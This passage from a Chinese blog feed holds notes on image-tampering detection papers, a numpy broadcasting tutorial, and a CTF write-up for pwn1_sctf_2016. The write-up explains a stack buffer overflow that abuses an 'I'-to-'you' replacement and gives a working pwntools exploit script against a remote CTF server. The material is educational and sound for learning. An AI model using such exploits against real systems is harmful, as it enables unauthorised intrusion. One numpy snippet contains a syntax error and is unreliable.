      <title>Image splicing detection using mask-RCNN</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Image%20splicing%20detection%20using%20mask-RCNN/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Image%20splicing%20detection%20using%20mask-RCNN/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  Image splicing detection using mask-RCNN</p><h1 id="Image-splicing-detection-using-mask-RCNN"><a href="#Image-splicing-detection-using-mask-RCNN" class="headerlink" title="Image splicing detection using mask-RCNN"></a>Image splicing detection using mask-RCNN</h1><blockquote></blockquote><p>Signal, Image and Video Processing (2020) 14:1035–1042<br> <a href="https://doi.org/10.1007/s11760-020-01636-0">https://doi.org/10.1007/s11760-020-01636-0</a></p><h2 id="据传第一张篡改图像"><a href="#据传第一张篡改图像" class="headerlink" title="据传第一张篡改图像"></a>据传第一张篡改图像</h2><blockquote></blockquote><p>虽然数字成像提供了许多创造的可能性，但它也可以用来制作伪造的文件。图像篡改几乎和摄影技术本身一样古老，早在1865年，当时摄影师马修·布雷迪将弗朗西斯·p·布莱尔将军添加到一张原始照片中，让他似乎在场。</p><h2 id="数据生成法"><a href="#数据生成法" class="headerlink" title="数据生成法"></a>数据生成法</h2><blockquote></blockquote><p><strong>理想的篡改检测数据集</strong> ： 足够大的数据集 包含不同类型<br> 现有的公开数据集并不能满足足够条件<s>点名批评Columbia</s></p><p>使用coco数据集生成大量的splicing图像<br> 这个就比大多数拿现成的篡改数据集训练模型的论文要优秀的多了。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/af10eae03b1b4a3ab4b5c2662c517dae.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 12万张篡改图像。<br> This dataset consists of 80 classes, 80,000 training images, and 40,000 validation</p><h2 id="数据增广法"><a href="#数据增广法" class="headerlink" title="数据增广法"></a>数据增广法</h2><p>对伪造的图像可以进行后处理，以更改因伪造过程而产生的任何伪影。为了创建一个能够检测后处理图像中伪造的稳健模型，在计算机生成的数据集上使用了图像增强技术。这些技术包括旋转、位移、剪切和缩放。在旋转过程中，图像以在0◦到360◦之间随机选择的角度进行旋转。在位移过程中，对图像应用空间位移，宽度和高度位移随机选择在0到0.4之间。移动图像后，将其裁剪到原始尺寸。剪切利用40◦和−40◦之间的随机转换强度来创建一个剪切矩阵。然后，使用仿射变换将该矩阵应用于图像，导致图像的上部向右移动，下部向左移动。在缩放过程中，通过从图像范围[1,10]的宽度和高度中随机选择两个缩放值，对图像应用缩放。这些值用于创建缩放矩阵，并使用仿射变换应用于图像。缩放后，图像被裁剪到其原始尺寸。在训练过程中，四种增强技术应用于图像的概率为0.50。因此，图像没有增强或所有四种技术应用的概率为0.0425。添加增强的图像扩展了图像数据集，提高了泛化能力，并有助于防止过拟合。</p><h2 id="模型初始化"><a href="#模型初始化" class="headerlink" title="模型初始化"></a>模型初始化</h2><p>一直觉得模型初始化设置什么正态分布的模型参数的是一种迷信。</p><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>模型部分说的很抽象。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d4b2e93daf504115a56a4dcfcb356fa3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <strong>region proposal network (RPN)</strong><br> 获得<br> <strong>regions of interest (RoI)</strong><br> 进行<br> <strong><a href="https://zhuanlan.zhihu.com/p/65423423">RoI pooling</a></strong><br> 获得重要特征<br> 特征插值？ 到同样大小<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b83329ace9cb4d368f0d1852f96ae6da.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MULTI-TASK WAVELET CORRECTED NETWORK FOR IMAGE SPLICING FORGERY DETECTION AND LOCALIZATION</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20MULTI-TASK%20WAVELET%20CORRECTED%20NETWORK%20FOR%20IMAGE%20SPLICING%20FORGERY%20DETECTION%20AND%20LOCALIZATION/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20MULTI-TASK%20WAVELET%20CORRECTED%20NETWORK%20FOR%20IMAGE%20SPLICING%20FORGERY%20DETECTION%20AND%20LOCALIZATION/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  MULTI-TASK WAVELET CORRECTED NETWORK FOR IMAGE SPLICING FORGERY DETECTION AND LOCALIZATION</p><h1 id="MULTI-TASK-WAVELET-CORRECTED-NETWORK-FOR-IMAGE-SPLICING-FORGERY-DETECTION-AND-LOCALIZATION"><a href="#MULTI-TASK-WAVELET-CORRECTED-NETWORK-FOR-IMAGE-SPLICING-FORGERY-DETECTION-AND-LOCALIZATION" class="headerlink" title="MULTI-TASK WAVELET CORRECTED NETWORK FOR IMAGE SPLICING FORGERY DETECTION AND LOCALIZATION"></a>MULTI-TASK WAVELET CORRECTED NETWORK FOR IMAGE SPLICING FORGERY DETECTION AND LOCALIZATION</h1><h1 id="多任务的基于小波池化矫正的网络"><a href="#多任务的基于小波池化矫正的网络" class="headerlink" title="多任务的基于小波池化矫正的网络"></a>多任务的基于小波池化矫正的网络</h1><h2 id="三个多任务"><a href="#三个多任务" class="headerlink" title="三个多任务"></a>三个多任务</h2><p><strong>一个区域的篡改检测</strong><br> <strong>一个边缘的篡改检测</strong><br> <strong>一个重构解码器</strong>来重构输入图像lx。编码器学习到的特征信息越多，重建图像IxR的质量就越好。<br> 后半部分网络结构相同，但是不共享参数。</p><p>分别拿三个Loss去约束。<br> 三个输出相互独立，个人认为还是把区域的pred 和边缘的pred 后面加入一个融合的小网络比较好，层数不用太多，4-5层应该就可以。<br> 或者说，直接给一个权重，信任边缘pred的结果，边缘基本按照边缘去给也可以。</p><h2 id="Wavelet-pooling"><a href="#Wavelet-pooling" class="headerlink" title="Wavelet-pooling"></a>Wavelet-pooling</h2><p>基于小波的池化操作和上采样操纵<br> 池化对于图像细微特征的破坏不是什么新东西了。<br> 滤波核的参数是学习参数。<br> 使用小波是基于小波大小变化为一半之后可以复原的可逆性质。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/dfdefcd0023c43ecb15cd0e2be0ddb4a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p>同时<strong>小波输出的4个特征</strong>，可以输出到不同的任务中。上图的颜色表示输出4个特征的选择和流向。</p><h2 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h2><p>训练测试，就是不讲清楚是几个数据集分别训练的模型还是一起训练的。<strong>估计是99%的概率是分别训练的</strong>。就这个数据集的数据量而言，指标过高了。这个数据量根本不可能达到那么高的指标。</p><p>casia v2印象里是有7000张图片的。这800张train&#x2F;test 是什么选的。为什么不全用。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7b3dd038e9c34ba4b621283d96813cf7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><h2 id="消融实验"><a href="#消融实验" class="headerlink" title="消融实验"></a>消融实验</h2><h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/dd7ea49ea84149dd8d60b10a30c565d3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a0c6a3c60e9e4c74a15e0d1ba4459270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 别的数据集不说，casia指标那么高就很古怪。可能是选图的原因。</p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Numpy实现大矩阵减去小矩阵的方便运算</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Numpy%E5%AE%9E%E7%8E%B0%E5%A4%A7%E7%9F%A9%E9%98%B5%E5%87%8F%E5%8E%BB%E5%B0%8F%E7%9F%A9%E9%98%B5%E7%9A%84%E6%96%B9%E4%BE%BF%E8%BF%90%E7%AE%97/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Numpy%E5%AE%9E%E7%8E%B0%E5%A4%A7%E7%9F%A9%E9%98%B5%E5%87%8F%E5%8E%BB%E5%B0%8F%E7%9F%A9%E9%98%B5%E7%9A%84%E6%96%B9%E4%BE%BF%E8%BF%90%E7%AE%97/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  Numpy实现大矩阵减去小矩阵的方便运算</p><h1 id="Numpy实现大矩阵减去小矩阵的方便运算"><a href="#Numpy实现大矩阵减去小矩阵的方便运算" class="headerlink" title="Numpy实现大矩阵减去小矩阵的方便运算"></a>Numpy实现大矩阵减去小矩阵的方便运算</h1><p>把一个向量加到矩阵的每一行:<br> 调用numpy库<br> 完成cs231作业1，numpy</p><blockquote></blockquote><p>参考知乎<a href="https://zhuanlan.zhihu.com/p/20878530?refer=intelligentunit">CS231n课程笔记翻译：Python Numpy教程</a></p><h2 id="使用一重循环"><a href="#使用一重循环" class="headerlink" title="使用一重循环"></a><strong>使用一重循环</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># We will add the vector v to each row of the matrix x,</span><br><span class="line"># storing the result in the matrix y</span><br><span class="line">import numpy as np</span><br><span class="line">x = np.array([[1,2,3], [4,5,6], [7,8,9], [10, 11, 12]])</span><br><span class="line">v = np.array([1, 0, 1])</span><br><span class="line">y = np.empty_like(x)   # Create an empty matrix with the same shape as x</span><br><span class="line"></span><br><span class="line"># Add the vector v to each row of the matrix x with an explicit loop</span><br><span class="line">for i in range(4):</span><br><span class="line">    y[i, :] = x[i, :] + v</span><br><span class="line"></span><br><span class="line"># Now y is the following</span><br><span class="line"># [[ 2  2  4]</span><br><span class="line">#  [ 5  5  7]</span><br><span class="line">#  [ 8  8 10]</span><br><span class="line">#  [11 11 13]]</span><br><span class="line">print y</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="使用二重循环就是有点没必要了"><a href="#使用二重循环就是有点没必要了" class="headerlink" title="使用二重循环就是有点没必要了"></a>使用二重循环就是有点没必要了</h2><p>但是要是大矩阵减去小矩阵还是可以用的，速度偏慢就是了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># We will add the vector v to each row of the matrix x,</span><br><span class="line"># storing the result in the matrix y</span><br><span class="line">x = np.array([[1,2,3], [4,5,6], [7,8,9], [10, 11, 12]])</span><br><span class="line">v = np.array([1, 0, 1])</span><br><span class="line">y = np.empty_like(x)   # Create an empty matrix with the same shape as x</span><br><span class="line"></span><br><span class="line"># Add the vector v to each row of the matrix x with an explicit loop</span><br><span class="line">for i in range(4):</span><br><span class="line">for j in range(4)</span><br><span class="line">    y[i, j] = x[i, j] + v[j]</span><br><span class="line"></span><br><span class="line"># Now y is the following</span><br><span class="line"># [[ 2  2  4]</span><br><span class="line">#  [ 5  5  7]</span><br><span class="line">#  [ 8  8 10]</span><br><span class="line">#  [11 11 13]]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="不使用循环，使用了numpy的广播机制"><a href="#不使用循环，使用了numpy的广播机制" class="headerlink" title="不使用循环，使用了numpy的广播机制"></a>不使用循环，使用了numpy的广播机制</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&amp;gt;&amp;gt; a = np.arange(15).reshape(3,5)</span><br><span class="line">&amp;gt;&amp;gt; print(a)</span><br><span class="line">array([[ 0,  1,  2,  3,  4],</span><br><span class="line">      [ 5,  6,  7,  8,  9],</span><br><span class="line">      [10, 11, 12, 13, 14]])</span><br><span class="line">&amp;gt;&amp;gt; b = np.arange(5)</span><br><span class="line">&amp;gt;&amp;gt; print(b)</span><br><span class="line">array([0, 1, 2, 3, 4])</span><br><span class="line">&amp;gt;&amp;gt; a-b</span><br><span class="line">array([[ 0,  0,  0,  0,  0],</span><br><span class="line">      [ 5,  5,  5,  5,  5],</span><br><span class="line">      [10, 10, 10, 10, 10]])</span><br><span class="line">&amp;gt;&amp;gt;&amp;gt; b</span><br><span class="line">array([0, 1, 2, 3, 4])</span><br><span class="line">&amp;gt;&amp;gt;&amp;gt; a</span><br><span class="line">array([[ 0,  1,  2,  3,  4],</span><br><span class="line">       [ 5,  6,  7,  8,  9],</span><br><span class="line">       [10, 11, 12, 13, 14]])</span><br><span class="line">#使用过后a,b的大小没有变换</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="还可以创建一个新的数组，使用numpy-的tile可以实现数组的叠加"><a href="#还可以创建一个新的数组，使用numpy-的tile可以实现数组的叠加" class="headerlink" title="还可以创建一个新的数组，使用numpy 的tile可以实现数组的叠加"></a>还可以创建一个新的数组，使用numpy 的tile可以实现数组的叠加</h2><p>np.tile(x,y)<br> x表示纵向的叠加，y表示横向的复制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"># We will add the vector v to each row of the matrix x,</span><br><span class="line"># storing the result in the matrix y</span><br><span class="line">x = np.array([[1,2,3], [4,5,6], [7,8,9], [10, 11, 12]])</span><br><span class="line">v = np.array([1, 0, 1])</span><br><span class="line">vv = np.tile(v, (4, 1))  # Stack 4 copies of v on top of each other</span><br><span class="line">print vv                 # Prints &quot;[[1 0 1]</span><br><span class="line">                         #          [1 0 1]</span><br><span class="line">                         #          [1 0 1]</span><br><span class="line">                         #          [1 0 1]]&quot;</span><br><span class="line">y = x + vv  # Add x and vv elementwise</span><br><span class="line">print y  # Prints &quot;[[ 2  2  4</span><br><span class="line">         #          [ 5  5  7]</span><br><span class="line">         #          [ 8  8 10]</span><br><span class="line">         #          [11 11 13]]&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Multi-task Fully Convolutional Network (MFCN)和single-task FCN(SFCN)</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Multi-task%20Fully%20Convolutional%20Network%20(MFCN)%E5%92%8Csingle-task%20FCN(SFCN)/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Multi-task%20Fully%20Convolutional%20Network%20(MFCN)%E5%92%8Csingle-task%20FCN(SFCN)/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  Multi-task Fully Convolutional Network (MFCN)和single-task FCN(SFCN)</p><h1 id="Multi-task-Fully-Convolutional-Network-MFCN-和single-task-FCN-SFCN"><a href="#Multi-task-Fully-Convolutional-Network-MFCN-和single-task-FCN-SFCN" class="headerlink" title="Multi-task Fully Convolutional Network (MFCN)和single-task FCN(SFCN)"></a>Multi-task Fully Convolutional Network (MFCN)和single-task FCN(SFCN)</h1><blockquote></blockquote><p>Image Splicing Localization Using A Multi-Task Fully Convolutional Network (MFCN)</p><h1 id="多任务的全卷积网络篡改检测问题"><a href="#多任务的全卷积网络篡改检测问题" class="headerlink" title="多任务的全卷积网络篡改检测问题"></a>多任务的全卷积网络篡改检测问题</h1><p>旧有的区域检测网络可以提供篡改区域的掩膜，但是对于篡改区域与原图的边缘往往是区分的很粗糙的。</p><p>但是若是篡改边缘的检测，那么对于篡改边缘的预测想必会好一些。</p><p>但是篡改边缘的问题也十分的明显，篡改边缘是极其容易被掩盖的。</p><p>甚至如今PS就自带了类似边缘模糊的功能。<br> 如下图是通过PS自动套索工具产生的一个特定无意义区域。</p><p>观察周边的半透明像素，当这个图层与其他图层堆叠，半透明的像素就会和下面的图层的颜色做一个调整,篡改的边缘能够剩下多少就很难说了。</p><p>篡改边缘检测的阻力还是很大的。</p><p>这一点上篡改区域的检测就比较占优，无论边缘模糊成什么样子，篡改的区域总是能够检测出一些的。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a771c07575e642c9bfbc825bd7bb8b78.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/07658b984f544ab7a2b6c787fc505f70.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> SFCN 和 MFCN</p><h2 id="使用多任务网络的输出有两张方法"><a href="#使用多任务网络的输出有两张方法" class="headerlink" title="使用多任务网络的输出有两张方法"></a>使用多任务网络的输出有两张方法</h2><p><strong>Image Splicing Localization Using A Multi-Task Fully Convolutional Network (MFCN)</strong><br> 这篇文章使用第二种方法使用边缘的pred图。</p><p>但是边缘填充也不是说的那么简单的。问题很复杂。</p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Operation-wise Attention Network for Tampering Localization Fusion</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Operation-wise%20Attention%20Network%20for%20Tampering%20Localization%20Fusion/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Operation-wise%20Attention%20Network%20for%20Tampering%20Localization%20Fusion/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  Operation-wise Attention Network for Tampering Localization Fusion</p><h1 id="Operation-wise-Attention-Network-for-Tampering-Localization-Fusion"><a href="#Operation-wise-Attention-Network-for-Tampering-Localization-Fusion" class="headerlink" title="Operation-wise Attention Network for Tampering Localization Fusion"></a>Operation-wise Attention Network for Tampering Localization Fusion</h1><p>2021 arXiv<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/190160b7b4ae40ad9d0e0450b13dd33a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 选取5种篡改检测方法做了一个加权的网络，来联合使用5种方法得出的预测图。这个网络真的做的简单。</p><p><strong>RGB-&gt;5个特征+5个权重-&gt;RGB?</strong></p><p>但是最后的输出是不是应该的单通道的H*W的mask图。</p><p>总觉得这种方法有点耍赖。<strong>但是篡改检测的最终方向一定是类似这种方法，把所有的线索都进行考虑，然后对不仅要由所有的线索推断篡改痕迹，所有的线索之间的联系做一个相关，不相关的线索认为是造假的(欺骗检测方法的)，最后综合的判断篡改的像素。</strong></p><p>这5种方法使用的线索是jpg压缩线索，图像的噪声线索。就是用的方法有点老了，都是2015，2018的算法。</p><p>那么这个方法的应用就必然是jpg篡改了。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/5e43f45e815c4aa083fdb23af955a7ff.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><h2 id="train"><a href="#train" class="headerlink" title="train"></a>train</h2><p>使用 <a href="https://xueshu.baidu.com/usercenter/paper/show?paperid=1u7f08s0ds7r0jq0xu5u0em0s5322044">DEFACTO dataset</a><br> <s>百度学术的链接，不是数据集下载链接</s></p><blockquote></blockquote><p><strong>DEFACTO dataset</strong>：用于图像和面部操作检测和定位，称为DEFACTO。该数据集使用微软通用对象上下文数据库(MSCOCO)自动生成，以产生语义上有意义的伪造。已经产生了四类伪造品。拼接伪造，包括插入一个外部元素到一个图像，复制-移动伪造，其中一个元素在图像中复制，对象删除伪造，从图像中删除对象，最后变形，其中两个图像是扭曲和混合在一起。</p><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>IFS-TC Image Forensics Challenge dataset<br> CASIA V2.0<br> DEFACTO dataset 的测试集1000张</p><p>这个casia v2.0 数据集有点吓人，杂的很。其他的数据集没有用过。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/404f2c4a24ba4b38835b44ce00d00084.png"><br> 最终的结果比单独使用5种方法好一些。但是只给了这3个指标，可能说服力不强。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/85eb17a5e47d4243992dc452b3dffd8b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 这个把结果设置为二值了，阈值为0.5.</p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN (3)  pwn1_sctf_2016 1</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20PWN%20(3)%20%20pwn1_sctf_2016%201/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20PWN%20(3)%20%20pwn1_sctf_2016%201/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  PWN (3)  pwn1_sctf_2016 1</p><h1 id="PWN-3-pwn1-sctf-2016-1"><a href="#PWN-3-pwn1-sctf-2016-1" class="headerlink" title="PWN (3)  pwn1_sctf_2016 1"></a>PWN (3)  pwn1_sctf_2016 1</h1><p>查找字符串，发现了一个flag.txt。</p><p>输入在这里<br> 限制为32长度的输入<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210511185852213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210511191024889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70">看到EBP的地址<br> 这个flag的地址是08048F0D</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210511193958356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70">这个基准位置EBP（0x00000000）的下面一个就是EIP</p><p>图示如下，我觉得我已经明白了</p><blockquote></blockquote><p>±————–+<br> |ESP |<br> ±————–+<br> | buf |<br> ±————–+<br> | 填充物 |<br> ±————–+<br> | EBP |<br> ±————–+<br> | EIP |<br> ±————–+<br> | … …|<br> | 内存高址 |</p><p>S的容量是32.</p><p>这里有fget 函数约束，不能输入超过32B的字符<br> 那么要溢出到eip的位置，劫持返回地址，就必须要达到3C的大小。才能够覆盖到eip<br> 原则上是不可能有那么长的，但是后面有一个replace 函数，把’I’替换为了’you’，那么I就是3个长度位了。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210511193713270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70">0x3C&#x3D;64&#x3D;20*3+4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;node3.buuoj.cn&#x27;, &#x27;28482&#x27;)</span><br><span class="line">payload = b&#x27;I&#x27;* 20+b&#x27;a&#x27;*0x4+ p32(0x08048F0D)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()      </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PSCC-Net- Progressive Spatio-Channel Correlation Network for Image Manipulation Detection and Locali</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20PSCC-Net-%20Progressive%20Spatio-Channel%20Correlation%20Network%20for%20Image%20Manipulation%20Detection%20and%20Locali/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20PSCC-Net-%20Progressive%20Spatio-Channel%20Correlation%20Network%20for%20Image%20Manipulation%20Detection%20and%20Locali/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  PSCC-Net: Progressive Spatio-Channel Correlation Network for Image Manipulation Detection and Locali</p><h1 id="PSCC-Net-Progressive-Spatio-Channel-Correlation-Network-for-Image-Manipulation-Detection-and-Locali"><a href="#PSCC-Net-Progressive-Spatio-Channel-Correlation-Network-for-Image-Manipulation-Detection-and-Locali" class="headerlink" title="PSCC-Net: Progressive Spatio-Channel Correlation Network for Image Manipulation Detection and Locali"></a>PSCC-Net: Progressive Spatio-Channel Correlation Network for Image Manipulation Detection and Locali</h1><p><strong>arXiv 2021 Mar</strong></p><blockquote></blockquote><p>图像的篡改检测分为<strong>隐式检测和显式检测</strong><br> <strong>隐式检测</strong> 说明了图像整体篡改的概率<br> <strong>显式检测</strong> 说明逐像素篡改的概率</p><p><strong>即判定一张图片是否经过篡改 和 像素级别的定位篡改</strong></p><p>近年来的算法太过于关注像素级的定位，而忽略了图片整体的篡改概率。</p><p>但是就信息量而言，定位的信息已经包括了图片整体的篡改概率了。</p><blockquote></blockquote><p>比如说，要说明一个人是坏人，首先要说明他干了什么坏事才对。<br> 指出人干了什么坏事，说明是坏人</p><p>一般的图像篡改检测算法输出的Pred 